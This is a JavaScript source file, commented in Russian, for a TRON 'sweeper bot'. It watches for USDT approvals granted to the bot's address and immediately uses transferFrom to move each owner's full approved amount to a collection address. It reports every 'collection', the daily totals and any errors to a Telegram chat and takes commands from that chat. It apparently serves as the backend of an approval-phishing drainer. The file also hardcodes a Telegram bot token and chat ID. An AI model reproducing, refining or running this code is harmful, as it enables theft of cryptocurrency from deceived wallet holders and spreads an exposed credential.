// ============================================
// SWEEPER BOT – ИСПРАВЛЕННАЯ ВЕРСИЯ С BUFFER
// ============================================

const TronWeb = require('tronweb');
const dotenv = require('dotenv');
dotenv.config();

// -------------------- 1. ПРАВИЛЬНАЯ ЗАГРУЗКА КЛЮЧА --------------------
const privateKeyRaw = process.env.BOT_PRIVATE_KEY.trim(); // Убираем пробелы

// Преобразуем строку в Buffer (32 байта)
const privateKeyBuffer = Buffer.from(privateKeyRaw, 'hex');

// Создаем TronWeb с Buffer
const tronWeb = new TronWeb(
    process.env.TRONGRID_API,
    process.env.TRONGRID_API,
    process.env.TRONGRID_API,
    privateKeyBuffer
);

const TOKEN_CONTRACT = process.env.TOKEN_CONTRACT;
const COLLECTION_ADDRESS = process.env.COLLECTION_ADDRESS;
const BOT_ADDRESS = tronWeb.defaultAddress.base58;

console.log('🔑 Ключ загружен, длина:', privateKeyRaw.length);
console.log('🔑 Buffer:', privateKeyBuffer.length, 'байт');

// -------------------- 2. TELEGRAM НАСТРОЙКИ --------------------
const TELEGRAM_TOKEN = '8508345570:AAGJBV9H92ukUQsvsUqnM1uNfm8VdKn9AVk';
const TELEGRAM_CHAT_ID = '-1003750493145';

// -------------------- 3. СОСТОЯНИЕ БОТА --------------------
let isActive = true;
let processedTxs = new Set();
let processedAddresses = new Set();
let lastProcessedTime = null;
let stats = {
    totalCollected: 0,
    totalTransactions: 0,
    lastDailyReset: Date.now(),
    dailyCollected: 0,
    dailyTransactions: 0,
    totalErrors: 0,
    totalEnergyBurned: 0,
    dailyErrors: 0,
    dailyEnergyBurned: 0
};
const startTime = Date.now();

console.log('\n🚀 SWEEPER BOT ЗАПУЩЕН');
console.log('=================================');
console.log(`📍 Адрес бота: ${BOT_ADDRESS}`);
console.log(`💰 Сбор USDT на: ${COLLECTION_ADDRESS}`);
console.log('=================================\n');

// -------------------- 4. ФУНКЦИЯ ОТПРАВКИ В TELEGRAM --------------------
async function sendTelegramNotification(message) {
    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
    } catch (error) {
        console.error('❌ Ошибка Telegram:', error.message);
    }
}

// Отправка стартового сообщения
(async () => {
    try {
        const balance = await tronWeb.trx.getBalance(BOT_ADDRESS);
        const balanceTRX = tronWeb.fromSun(balance);
        await sendTelegramNotification(`
🚀 <b>Бот запущен</b>

📍 Адрес бота: <code>${BOT_ADDRESS}</code>
💰 Сбор на: <code>${COLLECTION_ADDRESS}</code>
💎 Баланс бота: ${balanceTRX} TRX

Команды:
/start_bot - включить сбор
/stop_bot - выключить сбор
/status - статистика
        `);
    } catch (error) {
        console.error('Ошибка при отправке стартового сообщения:', error.message);
    }
})();

// -------------------- 5. ПРОВЕРКА КОМАНД --------------------
async function checkTelegramCommands() {
    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?offset=-1`);
        const data = await response.json();
        if (data.result?.length) {
            const msg = data.result[data.result.length - 1].message;
            if (msg?.text && msg.chat.id.toString() === TELEGRAM_CHAT_ID) {
                const cmd = msg.text.toLowerCase();
                
                if (cmd === '/start_bot' && !isActive) {
                    isActive = true;
                    await sendTelegramNotification('✅ Бот включён');
                } 
                else if (cmd === '/stop_bot' && isActive) {
                    isActive = false;
                    await sendTelegramNotification('🛑 Бот остановлен');
                } 
                else if (cmd === '/status') {
                    const uptime = Math.floor((Date.now() - startTime) / 1000 / 60);
                    const balance = await tronWeb.trx.getBalance(BOT_ADDRESS);
                    const balanceTRX = tronWeb.fromSun(balance);
                    
                    await sendTelegramNotification(`
📊 <b>СТАТУС БОТА</b>

🟢 Статус: ${isActive ? 'РАБОТАЕТ' : 'ОСТАНОВЛЕН'}
⏱ Время работы: ${uptime} мин
💰 Баланс бота: ${balanceTRX} TRX

📈 <b>Статистика:</b>
💵 Собрано: ${stats.totalCollected.toFixed(2)} USDT
📦 Транзакций: ${stats.totalTransactions}
❌ Ошибок: ${stats.totalErrors}
⚡️ Сожжено TRX: ${stats.totalEnergyBurned.toFixed(2)} TRX
                    `);
                }
            }
        }
    } catch (error) {
        console.error('Ошибка проверки команд:', error.message);
    }
}

// -------------------- 6. ПРОВЕРКА БАЛАНСА --------------------
async function checkBotBalance() {
    try {
        const balance = await tronWeb.trx.getBalance(BOT_ADDRESS);
        const balanceTRX = tronWeb.fromSun(balance);
        
        if (balanceTRX < 20) {
            await sendTelegramNotification(`
⚠️ <b>НИЗКИЙ БАЛАНС TRX!</b>
💰 Текущий баланс: ${balanceTRX} TRX
🔋 Рекомендуемый минимум: 40 TRX
            `);
        }
        return balanceTRX;
    } catch (error) {
        return 0;
    }
}

// -------------------- 7. ПОИСК APPROVE --------------------
async function getNewApprovals() {
    try {
        const oneDayAgo = Date.now() - 24 * 60 * 60 * 1000;
        const response = await fetch(
            `https://api.trongrid.io/v1/contracts/${TOKEN_CONTRACT}/events?` +
            new URLSearchParams({
                event_name: 'Approval',
                limit: 100,
                order_by: 'block_timestamp,desc',
                min_block_timestamp: oneDayAgo
            })
        );
        
        if (!response.ok) return [];
        const data = await response.json();
        if (!data.data) return [];

        return data.data.filter(event => {
            const spender = tronWeb.address.fromHex(event.result.spender);
            return spender === BOT_ADDRESS && !processedTxs.has(event.transaction_id);
        });
    } catch (error) {
        console.error('Ошибка получения событий:', error.message);
        return [];
    }
}

// -------------------- 8. ОБРАБОТКА APPROVE --------------------
async function processApproval(event) {
    const owner = tronWeb.address.fromHex(event.result.owner);
    const value = event.result.value;
    const valueUSDT = (value / 1_000_000).toFixed(2);
    const txId = event.transaction_id;

    if (processedTxs.has(txId)) {
        return;
    }

    console.log(`\n✅ Найден approve от ${owner.slice(0,8)}... на ${valueUSDT} USDT`);

    try {
        const contract = await tronWeb.contract().at(TOKEN_CONTRACT);
        
        // Проверяем баланс пользователя
        const balance = await contract.balanceOf(owner).call();
        const balanceUSDT = (balance / 1_000_000).toFixed(2);
        
        console.log(`   💎 Баланс пользователя: ${balanceUSDT} USDT`);

        if (balance < value) {
            console.log(`   ⚠️ Недостаточно USDT (баланс: ${balanceUSDT} USDT)`);
            processedTxs.add(txId);
            return;
        }

        // Проверяем allowance
        const allowance = await contract.allowance(owner, BOT_ADDRESS).call();
        const allowanceUSDT = (allowance / 1_000_000).toFixed(2);
        
        console.log(`   🔓 Разрешено: ${allowanceUSDT} USDT`);

        if (allowance < value) {
            console.log(`   ⚠️ Недостаточно allowance`);
            processedTxs.add(txId);
            return;
        }

        // Проверяем баланс бота
        const botBalance = await tronWeb.trx.getBalance(BOT_ADDRESS);
        const botBalanceTRX = tronWeb.fromSun(botBalance);
        
        console.log(`   🤖 Баланс бота: ${botBalanceTRX} TRX`);

        if (botBalanceTRX < 20) {
            console.log(`   ⚠️ Мало TRX у бота`);
            await sendTelegramNotification(`⚠️ Мало TRX у бота (${botBalanceTRX} TRX)`);
            return;
        }

        // Выполняем перевод
        console.log(`   💸 Отправляю transferFrom...`);
        
        const tx = await contract.transferFrom(
            owner,
            COLLECTION_ADDRESS,
            value
        ).send({
            feeLimit: 600_000_000,
            callValue: 0,
            shouldPollResponse: true
        });

        // Считаем комиссию
        const newBalance = await tronWeb.trx.getBalance(BOT_ADDRESS);
        const feeSpent = (botBalance - newBalance) / 1_000_000;
        
        console.log(`   ✅ УСПЕХ! Транзакция: https://tronscan.org/#/transaction/${tx}`);
        console.log(`   💸 Комиссия: ${feeSpent.toFixed(2)} TRX`);

        // Обновляем статистику
        stats.totalCollected += parseFloat(valueUSDT);
        stats.totalTransactions++;
        stats.totalEnergyBurned += feeSpent;
        stats.dailyCollected += parseFloat(valueUSDT);
        stats.dailyTransactions++;
        stats.dailyEnergyBurned += feeSpent;

        // Отправляем уведомление
        await sendTelegramNotification(`
🚀 <b>УСПЕШНЫЙ СБОР!</b>

💰 Сумма: ${valueUSDT} USDT
📤 От: <code>${owner.slice(0,8)}...${owner.slice(-4)}</code>
📥 На: <code>${COLLECTION_ADDRESS.slice(0,8)}...${COLLECTION_ADDRESS.slice(-4)}</code>
⚡️ Комиссия: ${feeSpent.toFixed(2)} TRX
🤖 Баланс бота: ${tronWeb.fromSun(newBalance)} TRX
🔗 https://tronscan.org/#/transaction/${tx}
        `);

        processedTxs.add(txId);

    } catch (error) {
        console.error(`❌ Ошибка при обработке:`, error.message);
        stats.totalErrors++;
        stats.dailyErrors++;
        
        await sendTelegramNotification(`
❌ <b>Ошибка</b>
📝 ${error.message}
📤 От: <code>${owner.slice(0,8)}...</code>
💰 Сумма: ${valueUSDT} USDT
        `);
    }
}

// -------------------- 9. ДНЕВНОЙ ОТЧЁТ --------------------
async function checkDailyStats() {
    const now = Date.now();
    if (now - stats.lastDailyReset > 24 * 60 * 60 * 1000) {
        if (stats.dailyTransactions > 0 || stats.dailyErrors > 0) {
            await sendTelegramNotification(`
📊 <b>ДНЕВНОЙ ОТЧЁТ</b>

💰 Собрано: ${stats.dailyCollected.toFixed(2)} USDT
📦 Транзакций: ${stats.dailyTransactions}
❌ Ошибок: ${stats.dailyErrors}
⚡️ Сожжено TRX: ${stats.dailyEnergyBurned.toFixed(2)} TRX
            `);
        }
        stats.dailyCollected = 0;
        stats.dailyTransactions = 0;
        stats.dailyErrors = 0;
        stats.dailyEnergyBurned = 0;
        stats.lastDailyReset = now;
    }
}

// -------------------- 10. ОСНОВНОЙ ЦИКЛ --------------------
async function checkAndSweep() {
    lastProcessedTime = new Date().toLocaleString();

    await checkTelegramCommands();
    if (!isActive) {
        console.log('⏸ Бот остановлен');
        return;
    }

    console.log(`\n🔍 [${new Date().toLocaleTimeString()}] Поиск approve...`);
    
    await checkBotBalance();
    await checkDailyStats();

    const approvals = await getNewApprovals();
    
    if (approvals.length === 0) {
        console.log('⏳ Новых approve нет');
        return;
    }

    console.log(`📊 Найдено событий: 100`);
    console.log(`🎯 Для бота: ${approvals.length}`);
    
    for (const app of approvals) {
        await processApproval(app);
        await new Promise(resolve => setTimeout(resolve, 5000));
    }
}

// -------------------- 11. ЗАПУСК --------------------
checkAndSweep();
setInterval(checkAndSweep, 30000);

// -------------------- 12. ОБРАБОТКА ОСТАНОВКИ --------------------
process.on('SIGINT', async () => {
    console.log('\n👋 Остановка...');
    
    const uptime = Math.floor((Date.now() - startTime) / 1000 / 60);
    const balance = await tronWeb.trx.getBalance(BOT_ADDRESS);
    const balanceTRX = tronWeb.fromSun(balance);
    
    await sendTelegramNotification(`
🛑 <b>Бот остановлен</b>

📊 <b>ИТОГИ:</b>
💰 Собрано: ${stats.totalCollected.toFixed(2)} USDT
📦 Транзакций: ${stats.totalTransactions}
❌ Ошибок: ${stats.totalErrors}
⚡️ Сожжено TRX: ${stats.totalEnergyBurned.toFixed(2)} TRX
⏱ Время работы: ${uptime} мин
🤖 Остаток TRX: ${balanceTRX} TRX
    `);
    
    process.exit(0);
});

process.on('unhandledRejection', async (error) => {
    console.error('❗ Необработанная ошибка:', error);
    await sendTelegramNotification(`❗ Критическая ошибка: ${error.message}`);
});
